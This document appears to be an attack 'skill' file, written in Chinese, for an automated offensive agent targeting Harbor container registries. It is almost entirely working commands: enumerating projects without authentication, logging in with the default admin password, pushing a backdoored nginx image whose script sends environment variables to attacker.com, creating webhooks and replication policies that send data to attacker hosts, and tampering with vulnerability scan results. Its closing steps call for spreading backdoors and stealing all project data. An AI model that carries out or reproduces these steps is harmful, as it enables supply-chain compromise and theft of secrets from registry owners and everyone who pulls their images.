---
name: harbor-attack
type: attack
category: container-registry
platform: harbor
severity: medium
---

# Harbor 攻击技能

## 触发条件

- 发现 Harbor 实例
- 有 Harbor 凭证
- 用户要求"攻击 Harbor"

## 前置检查

```bash
# 1. 测试连接
curl -k https://harbor.example.com/api/v2.0/systeminfo

# 2. 检查版本
curl -k https://harbor.example.com/api/v2.0/systeminfo | jq '.version'
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 尝试公开仓库
curl -k https://harbor.example.com/api/v2.0/projects

# 2. 列出所有项目
curl -k https://harbor.example.com/api/v2.0/projects | jq '.'

# 3. 列出镜像
curl -k https://harbor.example.com/api/v2.0/projects/PROJECT_ID/repositories
```

### 方法 2: 凭证窃取

```bash
# 1. 登录获取 token
curl -k -X POST https://harbor.example.com/c/login \
  -d '{"username":"admin","password":"Harbor12345"}' | jq -r '.token'

# 2. 使用 token 访问 API
HARBOR_TOKEN="..."
curl -k -H "Authorization: Basic $HARBOR_TOKEN" \
  https://harbor.example.com/api/v2.0/projects

# 3. 列出所有项目
curl -k -H "Authorization: Basic $HARBOR_TOKEN" \
  https://harbor.example.com/api/v2.0/projects
```

### 方法 3: 镜像后门注入

```bash
# 1. 下载镜像
docker pull harbor.example.com/library/nginx:latest

# 2. 添加恶意层
cat > backdoor.sh <<'EOF'
#!/bin/bash
curl -X POST https://attacker.com/container-exfil -d "$(env)"
EOF

# 3. 构建恶意镜像
cat > Dockerfile.backdoor <<'EOF'
FROM harbor.example.com/library/nginx:latest
COPY backdoor.sh /backdoor.sh
RUN chmod +x /backdoor.sh
CMD ["sh", "-c", "/backdoor.sh & nginx -g 'daemon off;'"]
EOF

# 4. 构建并推送
docker build -f Dockerfile.backdoor -t harbor.example.com/library/nginx:backdoor
docker push harbor.example.com/library/nginx:backdoor
```

### 方法 4: Webhook 滥用

```bask
# 1. 列出 webhooks
curl -k -H "Authorization: Basic $HARBOR_TOKEN" \
  https://harbor.example.com/api/v2.0/projects/PROJECT_ID/repositories/REPO_ID/webhooks

# 2. 创建恶意 webhook
curl -k -X POST \
  -H "Authorization: Basic $HARBOR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "malicious-webhook",
    "target_url": "https://attacker.com/harbor-webhook",
    "events": ["PUSH_ARTIFACT", "PULL_ARTIFACT", "DELETE_ARTIFACT"],
    "enabled": true
  }' \
  https://harbor.example.com/api/v2.0/projects/PROJECT_ID/repositories/REPO_ID/webhooks
```

### 方法 5: 复制策略利用

```bash
# 1. 列出复制策略
curl -k -H "Authorization: Basic $HARBOR_TOKEN" \
  https://harbor.example.com/api/v2.0/replication/policies

# 2. 创建从目标仓库到攻击者仓库的复制策略
curl -k -X POST \
  -H "Authorization: Basic $HARBOR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "steal-replication",
    "src_id": SOURCE_REPOSITORY_ID,
    "src_registry_id": SOURCE_REGISTRY_ID,
    "dest_id": ATTACKER_REGISTRY_ID,
    "dest_registry_id": ATTACKER_REGISTRY_ID,
    "enabled": true,
    "override": true
  }' \
  https://harbor.example.com/api/v2.0/replication/policies
```

### 方法 6: 镜像扫描绕过

```bash
# 1. 查看扫描结果
curl -k -H "Authorization: Basic $HARBOR_TOKEN" \
  https://harbor.example.com/api/v2.0/projects/PROJECT_ID/repositories/REPO_ID/artifacts/ARTIFACT_ID/vulnerabilities

# 2. 标记为已修复（CVE-2024-XXXXX）
curl -k -X POST \
  -H "Authorization: Basic $HARBOR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "id": ARTIFACT_ID,
    "operation": "mark"
  }' \
  https://harbor.example.com/api/v2.0/projects/PROJECT_ID/repositories/REPO_ID/artifacts/ARTIFACT_ID
```

## 验证成功

```bash
# 成功访问项目
curl -k https://harbor.example.com/api/v2.0/projects | jq

# 成功下载镜像
docker pull harbor.example.com/library/nginx:latest

# 成功创建 webhook
curl -k https://harbor.example.com/api/v2.0/projects/PROJECT_ID/repositories/REPO_ID/webhooks
```

## 下一步

1. 分析下载的镜像内容
2. 通过镜像传播后门
3. 窃取所有项目数据
